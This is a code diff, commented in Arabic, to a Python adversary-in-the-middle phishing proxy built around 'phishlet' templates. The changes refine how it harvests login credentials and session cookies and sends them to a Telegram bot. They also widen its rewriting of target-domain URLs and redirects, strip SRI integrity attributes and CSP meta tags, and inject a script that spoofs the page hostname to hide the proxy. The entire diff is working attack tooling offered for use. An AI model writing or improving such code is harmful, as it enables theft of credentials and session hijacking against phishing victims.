@@ -58,14 +58,12 @@ class PhishletLoader:
             target = data.get('target_domain', '')
             if target and (target in host or name.lower() in host.lower()):
                 return data
-        # إرجاع أول قالب كافتراضي إذا لم يتم العثور على تطابق
         if self.phishlets:
             first = next(iter(self.phishlets.values()))
             logging.info(f"ℹ️ No matching phishlet for host '{host}', using default: {first.get('name')}")
             return first
         return None
 
-# تحميل جميع القوالب عند بدء التشغيل
 loader = PhishletLoader()
 
 class PhishletEngine:
@@ -82,13 +80,14 @@ class PhishletEngine:
         self.force_post = phishlet_config.get('force_post', False)
 
     def send_to_telegram(self, message):
+        """إرسال رسالة إلى تيليجرام مع تقسيمها إذا طالت (أكثر من 4000 حرف)"""
         try:
-            # تقسيم الرسائل الطويلة (حد تيليجرام 4096 حرف)
-            for i in range(0, len(message), 4000):
+            max_len = 4000
+            for i in range(0, len(message), max_len):
                 url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                 payload = {
                     'chat_id': TELEGRAM_CHAT_ID,
-                    'text': message[i:i+4000],
+                    'text': message[i:i+max_len],
                     'parse_mode': 'HTML'
                 }
                 requests.post(url, json=payload, timeout=10)
@@ -103,11 +102,9 @@ class PhishletEngine:
 
     def capture_creds(self, form_data):
         found = {}
-        # البحث في الحقول المحددة مسبقاً
         for field in self.creds_fields:
             if field in form_data:
                 found[field] = form_data[field]
-        # البحث في أي حقل يحتوي على كلمات مفتاحية
         for key, value in form_data.items():
             if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password', '_user']):
                 found[key] = value
@@ -130,14 +127,12 @@ class PhishletEngine:
         return found
 
     def capture_full_session(self, cookies_jar, current_host, creds_data=None):
-        cookies_dict = {}
-        if hasattr(cookies_jar, 'get_dict'):
-            cookies_dict = cookies_jar.get_dict()
-        else:
+        # استخدام requests.utils.dict_from_cookiejar لتحويل الكوكيز بسهولة
+        cookies_dict = requests.utils.dict_from_cookiejar(cookies_jar) if hasattr(cookies_jar, 'get_dict') else {}
+        if not cookies_dict:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
 
-        # التحقق من وجود كوكيز المصادقة
         has_auth = any(k in cookies_dict for k in self.auth_tokens)
 
         if cookies_dict and has_auth:
@@ -171,7 +166,7 @@ class PhishletEngine:
         return None
 
     def rewrite_content(self, content, content_type, current_host):
-        """إعادة كتابة المحتوى باستخدام sub_filters وحقن JS"""
+        """إعادة كتابة المحتوى باستخدام تقنيات متعددة (من BeastEngineV3 والمشروع الرئيسي)"""
         if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
             return content
 
@@ -179,7 +174,7 @@ class PhishletEngine:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
 
-            # تطبيق sub_filters إذا وجدت
+            # 1. تطبيق sub_filters إذا وجدت
             if self.sub_filters:
                 for filt in self.sub_filters:
                     mimes = filt.get('mimes', [])
@@ -189,24 +184,35 @@ class PhishletEngine:
                         if search:
                             content = re.sub(search, replace, content, flags=re.IGNORECASE)
             else:
-                # استبدال افتراضي للنطاق
-                content = content.replace(f"https://{self.target_domain}", f"https://{current_host}")
-                content = content.replace(f"http://{self.target_domain}", f"https://{current_host}")
+                # 2. استبدال افتراضي شامل (مثل BeastEngineV3)
                 for proxy in self.proxy_hosts:
                     orig_sub = proxy.get('orig_sub', '')
                     if orig_sub:
                         orig_domain = f"{orig_sub}.{self.target_domain}"
-                        content = content.replace(orig_domain, current_host)
+                    else:
+                        orig_domain = self.target_domain
+                    # استبدال https://domain، http://domain، //domain، domain
+                    content = content.replace(f"https://{orig_domain}", f"https://{current_host}")
+                    content = content.replace(f"http://{orig_domain}", f"https://{current_host}")
+                    content = content.replace(f"//{orig_domain}", f"//{current_host}")
+                    content = content.replace(orig_domain, current_host)
 
-            # إزالة integrity لمنع SRI
+            # 3. إزالة integrity لمنع SRI
             content = re.sub(r'integrity="[^"]+"', '', content)
 
-            # إزالة CSP من meta tags
+            # 4. إزالة CSP من meta tags
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
 
-            # حقن JavaScript إذا وجد
+            # 5. إخفاء رأس CSP داخل النص
+            content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
+
+            # 6. حقن JavaScript إذا وجد
             if self.js_inject and '<head>' in content:
                 injection = f"<script>{self.js_inject}</script>"
+                content = content.replace('<head>', f'<head>{injection}')
+            elif '<head>' in content:
+                # حقن كود بسيط لمنع اكتشاف البروكسي (مستوحى من BeastEngineV3)
+                injection = f"<script>window.location.hostname='{current_host}';</script>"
                 content = content.replace('<head>', f'<head>{injection}')
 
             return content.encode('utf-8')
@@ -303,11 +309,16 @@ def proxy(path):
             location = resp.headers.get('Location', '')
             if location:
                 parsed = urlparse(location)
-                # استبدال النطاق الأصلي بالنطاق الحالي
-                if engine.target_domain in parsed.netloc or any(d in parsed.netloc for d in [p.get('domain', '') for p in engine.proxy_hosts]):
-                    new_location = location.replace(parsed.netloc, host)
-                else:
-                    new_location = location
+                new_location = location
+                for proxy in engine.proxy_hosts:
+                    orig_sub = proxy.get('orig_sub', '')
+                    if orig_sub:
+                        orig_domain = f"{orig_sub}.{engine.target_domain}"
+                    else:
+                        orig_domain = engine.target_domain
+                    if orig_domain in parsed.netloc:
+                        new_location = location.replace(parsed.netloc, host)
+                        break
                 proxy_resp = make_response('', resp.status_code)
                 proxy_resp.headers['Location'] = new_location
                 # نقل الكوكيز
